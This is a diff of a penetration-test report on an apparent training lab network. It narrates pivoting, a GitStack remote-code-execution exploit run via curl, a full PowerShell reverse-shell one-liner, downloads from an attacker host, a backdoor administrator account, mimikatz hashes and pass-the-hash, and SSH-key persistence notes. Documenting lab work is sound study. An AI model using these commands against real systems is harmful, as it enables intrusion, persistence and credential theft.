@@ -32,8 +32,8 @@ This first machine forwards the connection to a second machine, where a webserve
 In this network there is also a personal computer of the friend.
 
 During this assessment we were able to access the server where the website is hosted by exploiting a kwown vulnerability of the webserver *MiniServ 1.890*. In this access, we discovered two other IPs within this network:
-
-  - **10.200.105.200**
+  - **10.200.105.100**
+  - **10.200.105.150**
   - **10.200.105.250**
 
 ## Recommendations
@@ -47,15 +47,9 @@ During the information gathering we collected the necessary informatiou to ident
 During this penetration test, I was tasked with exploiting the exam network.
 The specific IP addresses were:
 
-**Exam Network**
-
-- **10.200.105.200**
-- **10.200.105.200**
-- **10.200.105.200**
-
 # Findings / Issues
 
-## Information disclosure - services and version
+## 1 - Information disclosure - services and version
 **Severity**
 High
 **Description**
@@ -71,7 +65,7 @@ The scan also reveals tha the server is running the OS **Centos**.
 **Recommendation**
 It is recommended to hide sensitive information, like versions and name of the services running, otherwise attackers can explore known vunerabilities.
 
-## Information disclosure - Sensitive personal information
+## 2- Information disclosure - Sensitive personal information
 **Severity**
 High
 **Description**
@@ -80,7 +74,7 @@ The webside in the URL https://thomaswreath.thm/ discloses senstive personal inf
 **Recommendation**
 It is recommended to avoid disclosing senstive personal information, since they may be use by attackers to perform impersonation and other kind of scams that uses existing identities. 
 
-## Services with known vulnerability
+## 3- Services with known vulnerability
 **Severity**
 Medium
 **Description**
@@ -98,14 +92,16 @@ Vulnerabilities:
 - MiniServ 1.890: Remote command execution in the parameter password_change.cgi
 - OpenSSL/1.1.1c: Potential Denial of Service by the usage of some functions
 
+By further exploiting the internal network, it was discovered that the *Gitstack* contains a known vulnerability described in the [Exploit Database GitStack 2.3.10 - Remote Code Execution](https://www.exploit-db.com/exploits/43777)
+
 **Recommendation**
 It is highly recommended to patch existing sercices to its current. This prevents attackers from exploiting known vulnerabilities.
 
-## Remote command execution on the webserver gives admininistrative privileges to the webserver
+## 4- Remote command execution gives admininistrative privileges to the webserver
 **Severity**
 High
 **Description**
-Using the existing vulnerability of the service **MiniServ 1.890**, it is possible to perform remote code execution (RCE) and get administrative access to the server. 
+Using the existing vulnerability of the service **MiniServ 1.890**, it is possible to perform remote code execution (RCE) and get directly administrative access to the webserver. 
 
 To achiev this result, the the python script of the [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107) was executed as following:
 
@@ -134,10 +130,73 @@ root
 prod-serv
 # https://
 ```
-**Recommendation**
-As described in the previous issue, it is recommended to keep services updated. Additionaly, all servers should run its services with minimal privileges as possible. In case an attacker can access the server, keeping minimal privileges prevent attackers from performing privilege escalation and other attacks that may affect the confidentiality, integrity and availability of the server, including scanning other hosts in the network not accessible through public interface.
 
-Running services or command as *root* should be restricted to minimal essential tasks.
+By exploiting the discovered vulnerability in the *GitStack* hosted on **10.200.105.150** and executing the RCE, it is possible to see that the commands are executed with  administrative privileges:
+![Executing the script that exploits GitStack](image-5.png)
+
+**Recommendation**
+As described in the previous issue, it is recommended to keep services updated. Additionaly, all servers should run its services with minimal privileges as possible. In case an attacker can break into the server, keeping minimal privileges prevent the access or execution of senstive and high privileged commands. Providing directly administrative access, creates a big attacking surface that compromises the confidentiality, integrity and availability of the servers and its users.
+
+Running services or command as with administrative privileges should be restriticted to meninal and only essential tasks.
+
+## 5- Disclosure from information through error page
+**Severity**
+High
+**Description**
+After gaining access to the webserver in 10.200.105.200, scanning the internal network and performing a port forwarding to the internal network. One of the discovered host, 10.200.105.150, has a service running on port 80, which can be openned through the browser:
+![Access to service running on 10.200.105.150](image-2.png)
+
+This error message provides information about existing paths withing this site. One of than direct the attacker to a login page:
+![Login page](image-3.png)
+
+**Recommendation**
+Error messages should not disclose sensitive or internal information referred to the server or systems. Those messages should bbe focused on how to solve the error. By providing internal information, the application creates an attacking surface that may be exploited by malicious users.
+
+## 4- Remote command execution on the GitStack server
+**Severity**
+High
+**Description**
+By exploiting the vulnerability in the GitStack running in host **10.200.105.150**, it is possible to perform remote code execution.
+
+For this task, the exploit [GitStack 2.3.10 - Remote Code Execution](https://www.exploit-db.com/exploits/43777) avaiable in the ExploitDatabase was used. Below there is a code-snipped of the changes:
+
+![IP and command can be changed to use this exploit](image-4.png)
+
+The execution of this script gives the following result:
+```
+# command: whoami
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+...
+[+] Execute command
+"nt authority\system
+" 
+
+# command: ipconfig
+"
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Link-local IPv6 Address . . . . . : fe80::e90a:8b34:8e17:6c3%6
+   IPv4 Address. . . . . . . . . . . : 10.200.105.150
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.200.105.1
+" 
+```
+
+The exploit create a backdook in PHP which allows an attacker to execute commandos withing the server without needing any credentials.
+
+**Recommendation**
+It is recommended to patch services to the latest version to avoid the exploit of known vulnerabilities.
 
 # Narrative
 
@@ -265,28 +324,10 @@ The result is a stabilized shell as shown above:
 
 Accessing the folder */root/.ssh/id_rsa*, it was possible to access the private key to access the server through ssh and transfer it to the attacking machine.
 
-## Pivoting and Accessing other Servers
+## Pivoting the webservers
 With the access to server where the website is hosted, it is possible to perform another enumeration to discover what other endepoints exists withing the internal network.
 
-Using the command below, it was possible to send ICMP packets to possible hosts on on the network:
-
-```
-for i in {1..255}; do (ping -c 1 10.200.105.${i} | grep "bytes from" &); done
-```
-As response, the command showed us that there is another IP on this network:
-  - **10.200.105.250**
-
-The following command allowed us to perform a port scanning on these to IPs to identify openned ports:
-
-```
-for i in {1..65535}; do (echo > /dev/tcp/10.200.105.250/$i) >/dev/null 2>&1 && echo $i is open; done
-```
-
-The result of this scanned showed us that the following ports are opnned on this host:
-- 22
-- 1337
-
-Our access allowed us to transfer files between the our attacking machine and the compromised webserver. We used the following commands:
+Our access allowed us also to transfer files between the our attacking machine and the compromised webserver. We used the following commands to transfer files:
 ```
 # Create a webserver on the attacking machine where the binaries are being hosted:
 sudo python3 -m http.server 80
@@ -294,33 +335,178 @@ sudo python3 -m http.server 80
 # From the comprimised server, we then fechted the desired files, in this case nmap and socat
 curl ATTACKING_IP/path/to/file -o /tmp/path/to/file && chmod +x /tmp/path/to/file
 
-curl 10.50.106.78/nmap -o /tmp/nmap-pat && chmod +x /tmp/nmap-pat
-curl 10.50.106.78/nc -o /tmp/nc-pat && chmod +x /tmp/nc-pat 
-curl 10.50.106.78/socat -o /tmp/socat-pat && chmod +x /tmp/socat-pat
+curl ATTACKING_IP/nmap -o /tmp/nmap-pat && chmod +x /tmp/nmap-pat
+curl 1ATTACKING_IP/socat -o /tmp/socat-pat && chmod +x /tmp/socat-pat
 ```
 
-The transfer binaries are *nmap* and *socat*. The first one to perform a network scanning and the second one to stablish contact with the hosts within the network. With *nmap*, it was possible to get result about the services running on the openned ports of the host **10.200.105.250**:
+The transfer binaries are *nmap* and *socat*. The first one to perform a network scanning and the second one to stablish contact with the hosts within the network. 
 
+We first used *nmap* to find hosts on this network. For this task we send the following command:
+```
+./nmap-pat -sn 10.200.105.1-255
+```
+We discovered that the following hosts are up:
+  - **10.200.105.100**
+  - **10.200.105.150**
+  - **10.200.105.250**
+
+By scanning those hosts with *nmap*, we got the following result:
+- **10.200.105.100**:
+```
+Host is up (-0.20s latency).
+All ports are filtered
+```
+- **10.200.105.150**:
+```
+Host is up (-0.0018s latency).
+Not shown: 6147 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+MAC Address: 02:63:55:96:E1:5F (Unknown)
+```
+- **10.200.105.250**:
 ```
 PORT     STATE SERVICE
 22/tcp   open  ssh
 1337/tcp open  menandmice-dns
 ```
-sshuttle -R  pwned@172.16.20.7 172.16.0.0/16
---ssh-cmd "ssh -i priv_key"
+
+The process of pivoting will be conclude once the first server can be used to access the other hosts in the network. To achieve this result, we used the tool *sshuttle*, which stablishes a connection to the comprimised server and allows the communication to the other hosts. The executed command is shown below:
+```
+sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.0.0/24 -x 10.200.105.200
+``` 
+
+Now, we access in through the browser the service running on **http://10.200.105.150/**:
+![Gitstack shows us an URL to a login page](image.png)
+
+Accessing the paths available, we get a login page:
+![Login Page](image-1.png)
+
+## Exploiting the GitStack
+The pivot access from the previous section, gave us access to the server where *GitStack* is hosted. This version of *GitStack* is vulnerable to Remote Code Execution avaiable in the Exploit Database unter [GitStack 2.3.10 - Remote Code Execution](https://www.exploit-db.com/exploits/43777).
+
+To execute this script, it is necessary to change the IP address to our target and the desired command to be executed:
+```
+# code snipped
+ip = '10.200.105.150'
+command = "whoami"
+
+# Result
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+...
+[+] Execute command
+"nt authority\system
+" 
+```
+
+It is also possible to exploit this vulnerability with the *curl* command, by sending a POST request and changing the parameter "a":
+```
+curl -X POST http://10.200.105.150/web/exploit-pat.php -d "a=whoami"
+
+#Response
+"nt authority\system
+"
+```
+
+We wanted to verify if the server where *GitStack* is hosted is connected to the outside world by sending ICPM packets:
+```
+curl -X POST http://10.200.105.150/web/exploit-pat.php -d "a=ping -n 5 Attacking-Machine"
+"
+Pinging Attacking-Machine with 32 bytes of data:
+
+
+Ping statistics for  Attacking-Machine:
+    Packets: Sent = 5, Received = 0, Lost = 5 (100% loss),
+```
+
+Since it is not connected, we decide create a reverse shell from the *GitStack* server (**10.200.105.150**) to the server, where we already have a foothold (**10.200.105.200**) using netcat. Since we have root in this server, we openned a port in the firewall to stablish our connection and started a listener there:
+```
+# Open firewall port
+firewall-cmd --zone=public --add-port 15987/tcp
+
+# Start listenert
+nc -tlvp 15987
+```
+
+We then sent the following powershell command as a parameter to our *curl* to the *GitStack* server to create a communication with the server .200:
+```
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.105.200',15987);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+curl -X POST http://10.200.105.150/web/exploit-pat.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.105.200%27%2C15987%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
+```
+
+This created a reverse shell from the **10.200.105.150** to **10.200.105.200**:
+![Command executed in the reverse shell](image-6.png)
+
+We know that this server is running a Windows OS. We created a foothold on this server, by adding a user:
+```
+# add user
+net user patota 123456 /add
+
+# add this new user to the admin group
+net localgroup Administrators patota /add
+
+# add this user to the "Remote Management Users" group
+net localgroup "Remote Management Users" patota /add
+```
+
+The result:
+![Newly created user added to admin group](image-7.png)
+
+We can then access this server remotly either with the Remote Desktop Protocol (RDP) or with the tool Evil-WinRM:
+![Accessing using Evil-WinRM](image-8.png)
+
+We can also get UI access using the tool *xfreerdp*:
+```
+xfreerdp /v:10.200.105.150 /u:patota /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+```
+
+By executing the powershell with our user, we can upload the tool *mimikatz* which allows us to extrack hash values and escalate privileged:
+```
+# Obtained hashs
+# User: Admin
+# Hash: 37db630168e5f82aafa8461e05c6bbd1
+# Pass: [Not found]
+
+# User: Thomas
+# Hash: 02d90eda8f6b6b06c32d5f207831101f
+# Pass: i<3ruby
+```
+
+Even without founding the password of the Administrator, it is still possible to login with this account using *evil-winrm* and performing a pass-the-hash attack:
+
+```
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.105.150
+```
+
+676     {0;000003e7} 1 D 20119          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;0014b5a9} 2 F 2300470     GIT-SERV\patota S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2347380     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+
+
 
 chattr -i authorized_keys
 cat screamz_rsa.pub >> authorized_keys
 chattr +i authorized_keys
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" >> authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaKVJ8cS6PMHToSo8yhJhACSILA8/P134PByQz7CFR8XsP/+MJvOpmP2FWdCgqk0nGUPeGb95LHboLCxB++nmBc4IB1YuVlKg582TqHXZkxpfX6pRVorv5ZUuE8huWxvONq69k1SW4yYf6RGFMfP5GejEhfTShnmx6Jo1Qaw8MbGGhwdawrtcvUT4AjDj7H5gFFTWj9qZ2APndYw0N6IdSzzm0yWQ/wNzl3AKIOrofj/0R3hm1Dc0MiLGRSDtF4ykaqHdB8wIgqUPVLHX0dtv7rHkW4G6cghYlbzqEYvdchwQnZMCtE9cyzY+PsxL3ZUeQueTMgRKHOKBouvNwIYlGfBwOmWrdqm2vNngHyE/978JCvstJ8QShkWlfFDnK/+bCaugSBD6azecTsd52TfMenb3d0Ji68vSdWmoQoy2ZN0SlscxiF/aTw/odVCWyk4ZO3QR6mF5OHbGwQNpvDktnj6enGMbSYysmGTLrxb4dBRIBmQ9jIJrlH51xrGhBWc0= patota" >> authorized_keys2
 
 
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBJjUen5EgdhSbhLrxxz9FIBnzBqUu9D5PrLlH3ckTT bruno.macedoxxi@hotmail.com" >> authorized_keys
-
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" > pat.pub
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzSgdiWcVQdOVu6F49M2ghOS7g4Efw7HNE3w7e0yukeo0fcsdpBEQuAB72qT129ADuklv1Xq98tz5WbpcsLUlj0uOi7z0J3gBxMn06u5hldMOdfSFbW87kOjVtKOQMMh+ims7fv9iQMrE8Wp0hhbRSTMDrSrOQwfLufeQuFpvuCRXrnAd0jAj+/z5IpeVV56DT4vXYGRxJjNXJVR8Tp1jHHcHAlK7w8jMs79dRdew4a5FGejR0bddIV1vKJ6EZCVEgYQzPGF2FZBGvLYeUx7sDl2Zb/hqDyj406EGrKA+WvEUp1AyDqst/zKitpbiZtjusDv9OJYGLqNF+oXOB4vpbSFEC+9DOw9y0Ar5kbIZhZdripHhUgRadidQeMCiw9Iuf6jxDqq015lQx5XDMof2uMUbe2eN9li8c7rp3KlpEAXgZ9yFC6yJuEkT6+Uqco2lncK2BCx2Rrqg52775zUz75mPPXgMmib38JYOm+dKNFFVNTVDvD/UyeJIdkyNzMis= root@tm-prod-serv" >> authorized_keys
 
 
+sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.0.0/24 -x 10.200.105.200
 
 
 
